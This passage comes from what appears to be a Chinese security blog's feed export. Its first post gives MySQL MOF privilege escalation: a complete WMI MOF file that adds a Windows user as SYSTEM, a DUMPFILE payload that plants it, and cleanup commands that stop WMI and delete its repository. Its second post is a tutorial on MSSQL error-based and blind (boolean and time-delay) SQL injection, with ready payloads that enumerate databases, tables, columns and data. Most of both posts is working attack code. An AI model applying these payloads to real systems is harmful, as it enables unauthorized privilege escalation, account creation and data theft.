Mysql版本大于5.1，我们需手动创建plugin文件夹，这是个棘手的问题<br>● mysql有写入文件的权限，即secure_file_priv的值为空<br>● mysql先要进行远程登录</p><h2 id="MOF-提权"><a href="#MOF-提权" class="headerlink" title="MOF 提权"></a>MOF 提权</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p>在windows平台下，c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将想要的操作通过代码存储到这个mof文件中，就可以实现权限提升。</p><p>利用条件：</p><ol><li>仅限windows 及适用于windows server2003及以下的版本</li><li>mysql用户具有root权限(对上面那个目录可写）</li><li>关闭了secure-file-priv</li></ol><h3 id="公开的nullevt-mof利用代码"><a href="#公开的nullevt-mof利用代码" class="headerlink" title="公开的nullevt.mof利用代码"></a>公开的nullevt.mof利用代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name = &quot;filtP2&quot;;</span><br><span class="line">Query = &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second = 5&quot;;</span><br><span class="line">QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name = &quot;consPCSV2&quot;;</span><br><span class="line">ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">ScriptText =</span><br><span class="line">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hpdoger 123456 /add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = $Consumer;</span><br><span class="line">Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="MOF文件利用"><a href="#MOF文件利用" class="headerlink" title="MOF文件利用"></a>MOF文件利用</h3><p>将上面的脚本上传到有读写权限的目录下：<br>这里我上传到了C:\Documents and Settings\test根据前面的phpmyadmin，我们使用sql语句将文件导入到c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;下。</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;mof提权文件及路径&#x27;) into dumpfile &#x27;c:/windows/system32/wbem/mof/nullevt.mof&#x27;</span><br></pre></td></tr></table></figure><p>值得一提的是，这里不能使用outfile，因为会在末端写入新行，因此mof在被当作二进制文件无法正常执行，所以我们用dumpfile导出一行数据。</p><h3 id="清除痕迹"><a href="#清除痕迹" class="headerlink" title="清除痕迹"></a>清除痕迹</h3><p>因为每隔一段时间时间，mof文件会被再次执行以致重新添加用户，所以想要清理痕迹得先暂时关闭 winmgmt服务再删除相关mof文件，这个时候在删除用户才会有效果<br>操作命令如下（已检验可以使用）：<br>停止 winmgmt 服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net stop winmgmt </span><br></pre></td></tr></table></figure><p>删除 Repository 文件夹 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmdir /s /q C:\Windows\system32\wbem\Repository\ </span><br></pre></td></tr></table></figure><p>手动删除 mof 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del C:\Windows\system32\wbem\mof\good\test.mof /F /S </span><br></pre></td></tr></table></figure><p> 删除创建的用户 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user hacker /del </span><br></pre></td></tr></table></figure><p>重新启动服务 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start winmgmt</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Udf提权&quot;&gt;&lt;a href=&quot;#Udf提权&quot; class=&quot;headerlink&quot; title=&quot;Udf提权&quot;&gt;&lt;/a&gt;Udf提权&lt;/h2&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前</summary>
      
    
    
    
    <category term="sql" scheme="https://yanyuhh.github.io/categories/sql/"/>
    
    
  </entry>
  
  <entry>
    <title>MSSQL 盲注和报错注入基础</title>
    <link href="https://yanyuhh.github.io/2022/06/04/MSSQL%20%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80-hello-mssql/"/>
    <id>https://yanyuhh.github.io/2022/06/04/MSSQL%20%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80-hello-mssql/</id>
    <published>2022-06-04T06:53:04.887Z</published>
    <updated>2022-08-26T12:42:33.569Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Mssql-盲注和报错注入"><a href="#Mssql-盲注和报错注入" class="headerlink" title="Mssql 盲注和报错注入"></a>Mssql 盲注和报错注入</h2><h3 id="Mssql-的基本库"><a href="#Mssql-的基本库" class="headerlink" title="Mssql 的基本库"></a>Mssql 的基本库</h3><blockquote><p>sysaltfiles：主数据库 保存数据库的文件<br>syscharsets：主数据库字符集与排序顺序<br>sysconfigures：主数据库 配置选项<br>syscurconfigs：主数据库当前配置选项<br>sysdatabases：主数据库服务器中的数据库<br>sslanguages：主数据库语言<br>syslogins：主数据库 登陆帐号信息<br>sysoledbusers：主数据库 链接服务器登陆信息<br>sysprocesses：主数据库进程<br>sysremotelogins主数据库 远程登录帐号<br>syscolumns：每个数据库 列<br>sysconstrains：每个数据库 限制<br>sysfilegroups：每个数据库 文件组<br>sysfiles：每个数据库 文件<br>sysforeignkeys：每个数据库 外部关键字<br>sysindexs：每个数据库 索引<br>sysmenbers：每个数据库角色成员<br>sysobjects：每个数据库所有数据库对象<br>syscomments：数据库对象的详细资料<br>syspermissio ns：每个数据库 权限<br>systypes：每个数据库 用户定义数据类型<br>sysusers：每个数据库 用户<br>sys.tables ： 所有数据表</p></blockquote><p>在着其中：<br>sys.databases这张表中储存了SQLServer中所有的数据库的库名；<br>sys.objects表中储存了SQLServer中所有的数据库的表名；<br>sys.columns表中储存了SQLServer中所有的数据表的列名。</p><p>sql server 主要函数<br>host_name() :返回服务器端主机名称。<br>current_user()：返回当前数据库用户。<br>db_name():返回当前数据库库名 。<br>char():将ASCII码转化为对应的字符。<br>ASCII():将字符转化为对应的ASCII码。<br>substring():截取字符串。</p><h3 id="Mssql-中用户权限"><a href="#Mssql-中用户权限" class="headerlink" title="Mssql 中用户权限"></a>Mssql 中用户权限</h3><p><img src="/../images/image.png" alt="image"></p><h3 id="MSSQL-报错注入"><a href="#MSSQL-报错注入" class="headerlink" title="MSSQL 报错注入"></a><strong>MSSQL 报错注入</strong></h3><h4 id="常用报错函数介绍"><a href="#常用报错函数介绍" class="headerlink" title="常用报错函数介绍"></a>常用报错函数介绍</h4><p><strong>convert()函数介绍：</strong><br>定义： convert() 函数是把日期转换为新数据类型的通用函数。<br>用法： 对于 convert(int,@@version)，convert 函数⾸先会执⾏第⼆个参数指定的SQL查询，然后尝试将查询结果转换为int类型。但是，由于这个SQL查询的结果是varchar类型，⽆法进⾏指定的转换，所以，convert函数会抛出 ⼀个SQL server错误消息，指出“SQL查询结果”⽆法转换为“int”类型，这样的话，攻击者就能得到的这个SQL查询的结果了</p><p><strong>quotename()函数介绍：</strong><br>定义： quotename() 函数默认在要处理的参数左右加上两个中括号，起到分隔符的作用，避免出现sql关键字异常。<br>用法： quotename(name)，给查询出的多个表名、列名加入中括号，或者其他符号为分隔符，进行分割，可使SQL注入结果更清晰。</p><p><strong>for xml path(’’)语句介绍：</strong><br>定义： 提供查询返回的结果为xml格式，此时返回的相当于一个字符串。<br>用法： 将查询到的数据，通过xml进行显示，path指定xml元素结点（行节点），该语句可以将查询到的所有数据通过XML进行显示。</p><p><strong>stuff()函数介绍：</strong><br>定义： stuff()函数将表中列的内容横向输出。<br>用法： stuff(param1, startIndex, length, param2)，将param1中自startIndex(SQL中都是从1开始，而非0)起，删除length个字符，然后用param2替换删掉的字符</p><h4 id="基本注入流程"><a href="#基本注入流程" class="headerlink" title="基本注入流程"></a>基本注入流程</h4><p><strong>基本测试函数</strong></p><blockquote><p>convert(int,@@version)     获取版本信息<br>convert(int,db_name())     数据库名字<br>convert(int,user)      当前⽤户名<br>convert(int,@@SERVERNAME)  获取有关服务器主机的信息</p></blockquote><h4 id="判断数据库数量"><a href="#判断数据库数量" class="headerlink" title="判断数据库数量"></a>判断数据库数量</h4><blockquote><p>CONVERT(int,(select  name from master.dbo.sysdatabases where dbid&gt;4))&#x2F;&#x2F;查询所有数据库，Mssql中系统表中基本表，前四个是系统表，第五个开始为用户表。</p></blockquote><p><img src="/../images/image-1654328022424.png" alt="image-1654328022424"></p><h4 id="当下数据库中的数据表"><a href="#当下数据库中的数据表" class="headerlink" title="当下数据库中的数据表"></a>当下数据库中的数据表</h4><blockquote><p>CONVERT(int,(select top 1 table_name from information_schema.columns))&#x2F;&#x2F;查询当前数据下的第一个数据表，top 1表示只显示查询的第一个结果。</p></blockquote><p><img src="/../images/image-1654327939056.png" alt="image-1654327939056"></p><h4 id="查询数据表中的字段"><a href="#查询数据表中的字段" class="headerlink" title="查询数据表中的字段"></a>查询数据表中的字段</h4><blockquote><p>convert(int,(select top 1 COLUMN_NAME from information_schema.columns where TABLE_NAME&#x3D;’stuinfo’))</p></blockquote><p><img src="/../images/image-1654328187034.png" alt="image-1654328187034"></p><blockquote><p>convert(int,(select top 1 COLUMN_NAME from information_schema.columns where TABLE_NAME&#x3D;cast(0x737475696E666F  as varchar)))<br>&#x2F;&#x2F; 这个查询列，需要将表名16进制，网址<a href="http://www.txttool.com/t/?id=NDgy">http://www.txttool.com/t/?id=NDgy</a></p></blockquote><p><img src="/../images/image-1654328428636.png" alt="image-1654328428636"></p><blockquote><p>convert(int,(select top 1 COLUMN_NAME from information_schema.columns where TABLE_NAME&#x3D;cast(0x737475696E666F as varchar) and COLUMN_NAME !&#x3D; ‘sid’))<br>)&#x2F;&#x2F; 在查询到第一个字段的时候，可以通过这个方法去查询第二个字段</p></blockquote><p><img src="/../images/image-1654328895412.png" alt="image-1654328895412"></p><h4 id="查询数据表中的数据"><a href="#查询数据表中的数据" class="headerlink" title="查询数据表中的数据"></a>查询数据表中的数据</h4><blockquote><p>convert(int,(select top 1 sid from stuinfo)) &#x2F;&#x2F;基本语句，列名就说字段名</p></blockquote><p><img src="/../images/image-1654329465858.png" alt="image-1654329465858"><br>这里由于sid的类型为int，并未报错</p><blockquote><p>convert(int,(select top 1 列名 from 表名 where 列名!&#x3D;’saul’)) &#x2F;&#x2F;同样的方法，去继续查询</p></blockquote><h3 id="MSSQL-注入盲注-布尔"><a href="#MSSQL-注入盲注-布尔" class="headerlink" title="MSSQL 注入盲注(布尔)"></a><strong>MSSQL 注入盲注(布尔)</strong></h3><p>一般在无回显的情况下去进行盲注，注入语句都不能单独使用，要与前面一个可执行的语句衔接</p><p>注释：count(*)返回行数</p><h4 id="先查看第一个用户表是否存在（dbid-5），然后一直往后查询"><a href="#先查看第一个用户表是否存在（dbid-5），然后一直往后查询" class="headerlink" title="先查看第一个用户表是否存在（dbid&#x3D;5），然后一直往后查询"></a>先查看第一个用户表是否存在（dbid&#x3D;5），然后一直往后查询</h4><blockquote><p>and (select count(*) from master.dbo.sysdatabases where dbid&#x3D;5)&#x3D;1<br>&#x2F;&#x2F;sysdatabases：主数据库服务器中的数据库，前四个为系统表从第五个开始为用户表</p></blockquote><p><img src="/../images/image-1654330078616.png" alt="image-1654330078616"></p><h4 id="在用户表存在的情况下，就可以开始盲注了-首先判断数据库的长度"><a href="#在用户表存在的情况下，就可以开始盲注了-首先判断数据库的长度" class="headerlink" title="在用户表存在的情况下，就可以开始盲注了,首先判断数据库的长度"></a>在用户表存在的情况下，就可以开始盲注了,首先判断数据库的长度</h4><blockquote><p>and (select count(*) from master.dbo.sysdatabases where dbid&#x3D;5 and len(name)&#x3D;4)&#x3D;1</p></blockquote><p><img src="/../images/image-1654330227000.png" alt="image-1654330227000"></p><h4 id="猜解数据库"><a href="#猜解数据库" class="headerlink" title="猜解数据库"></a>猜解数据库</h4><p>注释：<br><strong>substring(str,start,len)</strong> 截取字符串的作用，第一个参数为要截取的字符串，第二个参数为从哪里开始截取，第三个参数为截取的长度。<br><strong>ascii(char)</strong> 把字符转换为ascii值，因为我们dbid5的数据库名是Sales，他的第一个字符S是ASCII码为83，我们就可以使用下面的语句来判断：</p><blockquote><p>and ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid &gt; 4),1,1)) &#x3D; 83<br>and ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid&#x3D;5),1,1)) &#x3D; 83<br>&#x2F;&#x2F;后面只需要递增substring的第二个参数就可以，猜解数据库名字</p></blockquote><p><img src="/../images/image-1654330405090.png" alt="image-1654330405090"></p><h4 id="猜解当前数据库中的数据表的长度"><a href="#猜解当前数据库中的数据表的长度" class="headerlink" title="猜解当前数据库中的数据表的长度"></a>猜解当前数据库中的数据表的长度</h4><p>注释：<br>where后面这个查询语句，是查询students数据库下的第一个表，将表名赋值给name</p><blockquote><p>and(select count(*) from students.dbo.sysobjects where name in (select top 1 name from students.dbo.sysobjects where xtype&#x3D;’u’) and len(name)&#x3D;7)</p></blockquote><p><img src="/../images/image-1654330558935.png" alt="image-1654330558935"></p><h4 id="猜解数据库中数据表"><a href="#猜解数据库中数据表" class="headerlink" title="猜解数据库中数据表"></a>猜解数据库中数据表</h4><blockquote><p>and (select count(*) from students.dbo.sysobjects where name in (select top 1 name from students.dbo.sysobjects where xtype&#x3D;’u’) and ascii(substring(name,1,1))&#x3D;115)&#x3D;1</p></blockquote><p><img src="/../images/image-1654330661369.png" alt="image-1654330661369"></p><blockquote><p>and ascii(substring((select top 1 name from students..sysobjects where xtype&#x3D;’U’ and name  in (select top 1 name from students.sys.sysobjects where xtype&#x3D;’U’)),1,1))&#x3D;115</p></blockquote><p><img src="/../images/image-1654330712166.png" alt="image-1654330712166"></p><h4 id="猜测数据表中的列"><a href="#猜测数据表中的列" class="headerlink" title="猜测数据表中的列"></a>猜测数据表中的列</h4><blockquote><p>and ascii(substring((select top 1 name from syscolumns where id&#x3D;(select id from sysobjects where xtype&#x3D;0x75 and name&#x3D;’stuinfo’)),1,1)) &#x3D;115</p></blockquote><p><img src="/../images/image-1654330898021.png" alt="image-1654330898021"></p><h4 id="查询列中的数据"><a href="#查询列中的数据" class="headerlink" title="查询列中的数据"></a>查询列中的数据</h4><p>and ascii(substring((select top 1  sid from stuinfo),1,1)) &#x3D;115</p><p><img src="/../images/image-1654331063968.png" alt="image-1654331063968"></p><h3 id="MSSQL-注入盲注-延时"><a href="#MSSQL-注入盲注-延时" class="headerlink" title="MSSQL 注入盲注(延时)"></a><strong>MSSQL 注入盲注(延时)</strong></h3><h4 id="延时函数-WAITFOR-DELAY"><a href="#延时函数-WAITFOR-DELAY" class="headerlink" title="延时函数 WAITFOR DELAY"></a>延时函数 WAITFOR DELAY</h4><blockquote><p>WAITFOR是SQL Server中Transact-SQL提供的⼀个流程控制语句。它的作⽤就是等待特定时间，然后继续执⾏后 续的语句。它包含⼀个参数DELAY，⽤来指定等待的时间。</p><p>如果将该语句成功注⼊后，会造成数据库返回记录和 Web请求也会响应延迟特定的时间。由于该语句不涉及条件判断等情况，所以容易注⼊成功。根据Web请求是否有延迟，渗透测试⼈员就可以判断⽹站是否存在注⼊漏洞。同时，由于该语句并不返回特定内容，所以它也是盲注的重要检测⽅法。</p><p>语法：WAITFOR  DELAY  ‘0:0:n’<br>常见注入语法：IF  exists()  WAITFOR  DELAY  ‘0:0:5’</p></blockquote><h4 id="猜测数据库长度"><a href="#猜测数据库长度" class="headerlink" title="猜测数据库长度"></a>猜测数据库长度</h4><blockquote><p>if ((select count(*) from master.dbo.sysdatabases where dbid&#x3D;5)&#x3D;1) waitfor delay ‘0:0:3’–<br>&#x2F;&#x2F;判断用户数据库是否存在</p><p>if ((select count(*) from master.dbo.sysdatabases where dbid&#x3D;5 and len(name)&#x3D;4)&#x3D;1) waitfor delay ‘0:0:3’–<br>&#x2F;&#x2F;判断数据库长度</p></blockquote><h4 id="根据dbid查询挨个查询数据库名"><a href="#根据dbid查询挨个查询数据库名" class="headerlink" title="根据dbid查询挨个查询数据库名"></a>根据dbid查询挨个查询数据库名</h4><blockquote><p>if (ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid&#x3D;5),1,1)) &#x3D; 115) WAITFOR DELAY ‘0:0:3’–</p></blockquote><h4 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h4><blockquote><p>if ( (select count(*) from students.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype&#x3D;’u’) and len(name)&#x3D;5)&#x3D;1) WAITFOR DELAY ‘0:0:3’–<br>&#x2F;&#x2F;猜解数据表长度</p><p>if ((select count(*) from students.dbo.sysobjects where name in (select top 1 name from students.dbo.sysobjects where xtype&#x3D;’u’) and ascii(substring(name,1,1))&#x3D;115)&#x3D;1) WAITFOR DELAY ‘0:0:3’–<br>&#x2F;&#x2F;猜解表名</p><p>if ((select count(*) from students.dbo.sysobjects where name in (select top 1 name from students.dbo.sysobjects where xtype&#x3D;’u’ and name not in (‘stuinfo’)) and ascii(substring(name,1,1))&#x3D;115)&#x3D;1) WAITFOR DELAY ‘0:0:3’–<br>&#x2F;&#x2F;使用not语句，去猜解第二个表的名字</p></blockquote><h4 id="猜解列名"><a href="#猜解列名" class="headerlink" title="猜解列名"></a>猜解列名</h4><blockquote><p>if (exists(select top 1 name from syscolumns where id &#x3D;(select id from sysobjects where name &#x3D; ‘users’) and unicode(substring(name,1,1))&#x3D;115)) WAITFOR DELAY ‘0:0:3’–、<br>&#x2F;&#x2F;方法一</p><p>if (ascii(substring((select top 1 name from syscolumns where id&#x3D;(select id from sysobjects where xtype&#x3D;0x75 and name&#x3D;’users’)),1,1)) &#x3D;115) WAITFOR DELAY ‘0:0:3’–<br>&#x2F;&#x2F;方法二，0x75就是u</p></blockquote><h4 id="在知道表名何列名的情况下，去爆数据"><a href="#在知道表名何列名的情况下，去爆数据" class="headerlink" title="在知道表名何列名的情况下，去爆数据"></a>在知道表名何列名的情况下，去爆数据</h4><blockquote><p>if (ascii(substring((select top 1 sid from stuinfo),1,1)) &#x3D; 115) WAITFOR DELAY ‘0:0:3’–</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Mssql-盲注和报错注入&quot;&gt;&lt;a href=&quot;#Mssql-盲注和报错注入&quot; class=&quot;headerlink&quot; title=&quot;Mssql 盲注和报错注入&quot;&gt;&lt;/a&gt;Mssql 盲注和报错注入&lt;/h2&gt;&lt;h3 id=&quot;Mssql-的基本库&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="sql" scheme="https://yanyuhh.github.io/categories/sql/"/>
    
    
  </entry>
  
</feed>
